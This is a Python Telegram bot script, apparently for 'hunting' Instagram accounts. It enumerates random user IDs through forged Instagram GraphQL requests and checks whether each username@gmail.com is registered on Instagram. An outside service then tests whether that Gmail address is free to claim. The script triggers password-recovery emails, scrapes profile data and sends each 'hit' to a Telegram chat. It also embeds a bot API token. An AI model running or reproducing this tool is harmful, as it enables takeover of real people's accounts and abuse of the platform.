import requests
import time
from time import time
from hashlib import md5
from user_agent import generate_user_agent
from random import randrange,choice
from threading import Thread
from requests import post as pp
from user_agent import generate_user_agent as gg
from uuid import uuid4
from random import choice as cc
import requests,random
from time import time
from user_agent import generate_user_agent
import secrets
import json
import time
import os
import threading
from threading import Thread
from faker import Faker
from concurrent.futures import ThreadPoolExecutor
import datetime,sys
import sys as n
import threading
import time as mm
from random import randrange as okk
import telebot
from telebot import types


bot = telebot.TeleBot("6998762751:AAE-RYL0UWGozbsZXots42DAJwEfQWqTtSs")
L7N1 = types.InlineKeyboardButton(text ="Click To Start ⚡",callback_data = "L7N1")
L7N_2 = types.InlineKeyboardButton(text ="Programmer",url="t.me/g_4_q")

@bot.message_handler(commands=["start"])
def start(message):
	photo = f"t.me/{message.from_user.username}"
	tag = f"[{message.from_user.first_name}]({photo})"
	text = f"*Hello* {tag}* To Bot Check IG 🐉 !*"
	L7Nbut1 = types.InlineKeyboardMarkup()
	L7Nbut1.add(L7N1)
	L7Nbut1.add(L7N_2)
	bot.send_photo(message.chat.id,photo,text ,
 parse_mode="Markdown",reply_markup=L7Nbut1)
@bot.callback_query_handler(lambda call:True)
def call(call): 
		if call.data == "L7N1":
			messag=bot.send_message(chat_id=call.message.chat.id,text=' *Send Your Name bro :*',parse_mode='Markdown')
			bot.register_next_step_handler(messag,Face,messag.id)

ids=[]
def uu():
  
  re= str(randrange(27000000,40000000))
  if re not in ids:
    ids.append(re)
    return re
  else:
    uu()

def username1():
  global m
  try:
    while True:
      re=uu()
      csrftoken = secrets.token_hex(32)
      mmidd=secrets.token_hex(27)
      ig_=secrets.token_hex(36)
      datrr=secrets.token_hex(24)
      faker = Faker()
      fak = faker.user_agent()
      app=''.join(random.choice('936619743392459')for i in range(15))
      cookies = {
    'csrftoken': csrftoken,
    'ps_l': '0',
    'ps_n': '0',
    'ig_did': f'{ig_}',
    'ig_nrcb': '1',
    'dpr': '2.1988937854766846',
    'mid': mmidd,
    'datr': datrr,
}

      headers = {
    'authority': 'www.instagram.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'csrftoken=GpSFJXM8cw5Ridi72oRh18; ps_l=0; ps_n=0; ig_did=BFD5A6E1-D993-48EE-914E-A6A5A2CC8D6D; ig_nrcb=1; dpr=2.1988937854766846; mid=ZhLiHgAEAAE63kJS7yz7sG6sp5mw; datr=HuISZrdPWEfDXxhdMTlBClqV',
    'dpr': '2.19889',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/a_1_in/?igsh=czFtZ3o1aDhraG01',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fak,
    'viewport-width': '891',
    'x-asbd-id': '129477',
    'x-csrftoken': csrftoken,
    'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
    'x-fb-lsd': 'AVoRhvRPoRs',
    'x-ig-app-id': app,
}

      data = {
    'av': '0',
    '__d': 'www',
    '__user': '0',
    '__a': '1',
    '__req': '1',
    '__hs': '19820.HYP:instagram_web_pkg.2.1..0.0',
    'dpr': '2',
    '__ccg': 'UNKNOWN',
    '__rev': '1012604142',
    '__s': 'dmjo05:l5d6wo:20s0u7',
    '__hsi': '7355192092986103751',
    '__dyn': '7xeUjG1mxu1syUbFp40NonwgU29zEdF8aUco2qwJw5ux609vCwjE1xoswaq0yE7i0n24oaEd86a3a1YwBgao6C0Mo2swaO4U2zxe2GewGwso88cobEaU2eUlwhEe87q7U88138bpEbUGdwtU662O0Lo6-3u2WE5B0bK1Iwqo5q1IQp1yUoxe4UrAwCAxW6U',
    'csr': 'gVb2snsIjkIQyjRmBaFGECih59Fb98nQBzbZ2IN8BqBGl7h9Am4ohAAD-vGBh4GizA-4aAiJ2vFDUR3qx596AhrBgzJlBKmu6VHiypryUkByrGiicgPAx6iUpGEOmqfykFA4801kXEkOwmU1Tqwvk8wCix64E0b_EaWdguwozat2F61-wiokxG0d9w2MFU5Kzo0k6wiU7Kut2F601_Ew1me','comet_req': '7','lsd': 'AVoRhvRPoRs',
    'jazoest': '21036',
    '__spin_r': '1012604142',
    '__spin_b': 'trunk',
    '__spin_t': '1712514108',
    'fb_api_caller_class': 'RelayModern',
    'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
    'variables': '{"id":"'+re+'","relay_header":false,"render_surface":"PROFILE"}',
    'server_timestamps': 'true',
    'doc_id': '7381344031985950',
}

      response = requests.post('https://www.instagram.com/api/graphql', cookies=cookies, headers=headers, data=data).json()
      username = response['data']['user']['username']  
      if '_' in username:
      	continue
      else:
      	if len(username) >= 6:
      		return username	        		
  except:
  	
  	pass



def Face(message,id):
	hunt = 0
	bad = 0
	good =0
	Bad=0
	check1 =0
	while True:
	 	try:
	 		email = username1()
	 	except:
	 		pass
	 	check1+=1
	 	from time import time
	 	csrftoken = md5(str(time()).encode()).hexdigest()
	 	ua=generate_user_agent()
	 	app=''.join(random.choice('936619743392459')for i in range(15))
	 	headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/accounts/signup/email/',
        'user-agent': ua,
        'x-csrftoken': csrftoken
    }
	 	data = {
        'email': f'{email}@gmail.com',
    }
	 	response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data=data)
   #   print(response.text)
	 	if 'email_is_taken' in str(response.text):
	 		good+=1
	 		url = requests.get(f'https://gmail-check-3c5c631290c7.herokuapp.com/qredes/gmail/?email={email}@gmail.com').text
	 		if "good" in url:
	 			hunt+=1
	 			he={'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar,en;q=0.9',
'cookie': f'ig_did={uuid4}; datr=8J8TZD9P4GjWjawQJMcnRdV_; mid=ZBOf_gALAAGhvjQbR29aVENHIE4Z; ig_nrcb=1; csrftoken=5DoPPeHPd4nUej9JiwCdkvwwmbmkDWpy; ds_user_id=56985317140; dpr=1.25',
'referer': f'https://www.instagram.com/{email}/?hl=ar',
'sec-ch-prefers-color-scheme': 'dark',
'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.138", "Google Chrome";v="112.0.5615.138", "Not:A-Brand";v="99.0.0.0"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-ch-ua-platform-version': '"10.0.0"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': generate_user_agent(),
'viewport-width': '1051',
'x-asbd-id': '198387',
'x-csrftoken': '5DoPPeHPd4nUej9JiwCdkvwwmbmkDWpy',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': '0',
'x-requested-with': 'XMLHttpRequest',}
 	          			
	 			headers2 = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
	 			data2 = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+email+'"}',
    'ig_sig_key_version': '4',
};req = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers2,data=data2,)
	 			rr = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={email}',headers=he).json()
	 			try:
 	          						Id = rr['data']['user']['id']
 	          						name =rr['data']['user']['full_name']
 	          						bio = rr['data']['user']['biography']
 	          						flos = rr['data']['user']['edge_followed_by']['count']
 	          						flog = rr['data']['user']['edge_follow']['count']
 	          						pr =rr['data']['user']['is_private']
 	          						post = rr['data']['user']['edge_owner_to_timeline_media']['count']
 	          						re = requests.get(f"https://o7aa.pythonanywhere.com/?id={Id}").json()
 	          						da = re['date']
 	          						try:
 	          							rest = req.json()['email']
 	          						except:
 	          							rest =''
	 			except:
 	          									Id= '';name='';bio = '';flos ='';flog = '';pr='';post = '';da = ''
 	          				 				
 	          			
	 			huntt=f"""
☆ New Hunt for You Good Luck..♡
ᯓᯓᯓᯓᯓᯓᯓᯓᯓ
☆ Hunt —> {hunt}
☆ Name —> {name}
☆ User —>  {email}
☆ Email —>  {email}@gmail.com
☆ Followers —> {flos}
☆ Following —> {flog}
☆ Date —> {da}
☆ Post —> {post}
☆ Id —> {Id}
☆ Private —> {pr}
☆ Bio —> {bio}
☆ Rest —> {rest}
☆ Url —> https://www.instagram.com/{email}
ᯓᯓᯓᯓᯓᯓᯓᯓᯓ
☆ Bio —> @g_4_q - @ToPython 		
 	          			"""
	 			bot.send_message(message.chat.id,huntt)
	 			
	 		else:
	 			Bad+=1	 			
	 	else:
	 			bad+=1	 	
	 	check=types.InlineKeyboardButton(text=f" Email : {email}@gmail.com", callback_data="L7NL7N")
	 	OK1 =types.InlineKeyboardButton(text=f"Hunt : {hunt}", callback_data="L7NL7N")
	 	CP1 =types.InlineKeyboardButton(text=f"Bad IG : {bad}", callback_data="L7NL7N")
	 	CP2 =types.InlineKeyboardButton(text=f"Good IG : {good}", callback_data="L7NL7N")
	 	OK =types.InlineKeyboardButton(text=f"Check : {check1}", callback_data="L7NL7N")
	 	stop =types.InlineKeyboardButton(text="STOP ❌", callback_data="L7NL7N")
	 	L7Nurl =types.InlineKeyboardButton(text="Programmer 🥇 ", url="t.me/g_4_q")
	 	add_but = types.InlineKeyboardMarkup(row_width=4)
	 	add_but = types.InlineKeyboardMarkup()
	 	add_but.add(check)
	 	add_but.add(OK1)
	 	add_but.add(CP2,CP1)
	 	add_but.add(OK)
	 	add_but.add(stop)	 			
	 	add_but.add(L7Nurl)
	 	bot.edit_message_text(chat_id=message.chat.id,message_id=id,text="""
Checking in Progress, Good Luck.. ! 
By : [𝐋7𝐍 «𓆩ᶠᴮᴵ𓆪» ™](t.me/g_4_q)
""",parse_mode='Markdown',disable_web_page_preview=True,reply_markup=add_but)	 
	 	

def bot_thread():
    if __name__ == '__main__':
        bot.polling(none_stop=True)

thread = threading.Thread(target=bot_thread)
thread.start()
